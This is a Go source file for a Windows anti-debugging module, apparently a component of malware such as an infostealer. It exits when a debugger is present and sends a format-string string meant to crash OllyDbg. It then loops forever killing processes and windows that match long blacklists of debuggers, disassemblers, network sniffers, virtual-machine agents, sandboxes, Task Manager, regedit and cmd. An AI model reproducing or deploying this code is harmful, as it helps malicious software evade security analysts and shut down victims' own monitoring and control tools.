package antidebug

import (
	"fmt"
	"os"
	"strings"
	"syscall"
	"unsafe"

	"github.com/shirou/gopsutil/v3/process"
)

var (
	user32DLL       = syscall.NewLazyDLL("user32.dll")
	enumWindowsProc = user32DLL.NewProc("EnumWindows")
	getWindowText   = user32DLL.NewProc("GetWindowTextA")
	getWindowThread = user32DLL.NewProc("GetWindowThreadProcessId")

	kernel32DLL          = syscall.NewLazyDLL("kernel32.dll")
	isDebugger           = kernel32DLL.NewProc("IsDebuggerPresent")
	debugString          = kernel32DLL.NewProc("OutputDebugStringA")
	procOpenProcess      = kernel32DLL.NewProc("OpenProcess")
	procTerminateProcess = kernel32DLL.NewProc("TerminateProcess")
)

func terminateProcess(pid uint32) error {
	handle, _, _ := procOpenProcess.Call(syscall.PROCESS_TERMINATE, 0, uintptr(pid))
	if handle == 0 {
		return fmt.Errorf("failed to open process")
	}
	defer syscall.CloseHandle(syscall.Handle(handle))

	ret, _, _ := procTerminateProcess.Call(handle, 0)
	if ret == 0 {
		return fmt.Errorf("failed to terminate process")
	}
	return nil
}

func KillProcessesByNames(blacklist []string) error {
	processes, _ := process.Processes()

	for _, p := range processes {
		processName, _ := p.Name()

		if contains(blacklist, processName) {
			terminateProcess(uint32(p.Pid))
		}
	}

	return nil
}

func getCallback(blacklist []string) uintptr {
	return syscall.NewCallback(func(hwnd syscall.Handle, lparam uintptr) uintptr {
		var title [256]byte

		getWindowText.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&title)), uintptr(len(title)))

		titleStr := string(title[:])

		if titleStr == "" {
			return 1
		}

		if contains(blacklist, titleStr) {
			var pid uint32
			getWindowThread.Call(uintptr(hwnd), uintptr(unsafe.Pointer(&pid)))

			terminateProcess(pid)

		}
		return 1
	})
}

func KillProcessesByWindowsNames(callback uintptr) error {
	enumWindowsProc.Call(callback, 0)
	return nil
}

func IsDebuggerPresent() bool {
	flag, _, _ := isDebugger.Call()
	return flag != 0
}

func outputDebugString(message string) {
	debugString.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(message))))
}

func OutputDebugStringAntiDebug() {
	outputDebugString("hm")
}

func OutputDebugStringOllyDbgExploit() {
	outputDebugString("%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s")
}

func contains(slice []string, processName string) bool {
	processName = strings.ToLower(processName)

	for _, s := range slice {
		if strings.Contains(processName, s) {
			return true
		}
	}

	return false
}

func Run() {
	if IsDebuggerPresent() {
		os.Exit(0)
	}

	blacklist := []string{
		"ksdumperclient", "regedit", "ida64", "vmtoolsd", "vgauthservice",
		"wireshark", "x32dbg", "ollydbg", "vboxtray", "df5serv", "vmsrvc",
		"vmusrvc", "taskmgr", "vmwaretray", "xenservice", "pestudio", "vmwareservice",
		"qemu-ga", "prl_cc", "prl_tools", "cmd",
		"joeboxcontrol", "vmacthlp", "httpdebuggerui", "processhacker",
		"joeboxserver", "fakenet", "ksdumper", "vmwareuser", "fiddler",
		"x96dbg", "dumpcap", "vboxservice",
	}

	callback := getCallback([]string{
		"simpleassemblyexplorer", "dojandqwklndoqwd", "procmon64", "process hacker",
		"sharpod", "http debugger", "dbgclr", "x32dbg", "sniffer", "petools",
		"simpleassembly", "ksdumper", "dnspy", "x96dbg", "de4dot", "exeinfope",
		"windbg", "mdb", "harmony", "systemexplorerservice", "megadumper",
		"system explorer", "mdbg", "kdb", "charles", "stringdecryptor", "phantom",
		"debugger", "extremedumper", "pc-ret", "folderchangesview", "james",
		"process monitor", "protection_id", "de4dotmodded", "x32_dbg", "pizza", "fiddler",
		"x64_dbg", "httpanalyzer", "strongod", "wireshark", "gdb", "graywolf", "x64dbg",
		"ksdumper v1.1 - by equifox", "wpe pro", "ilspy", "dbx", "ollydbg", "x64netdumper",
		"scyllahide", "kgdb", "systemexplorer", "proxifier", "debug", "httpdebug",
		"httpdebugger", "0harmony", "mitmproxy", "ida -",
		"codecracker", "ghidra", "titanhide", "hxd", "reversal",
	})

	for {
		OutputDebugStringAntiDebug()
		OutputDebugStringOllyDbgExploit()

		KillProcessesByNames(blacklist)
		KillProcessesByWindowsNames(callback)
	}
}
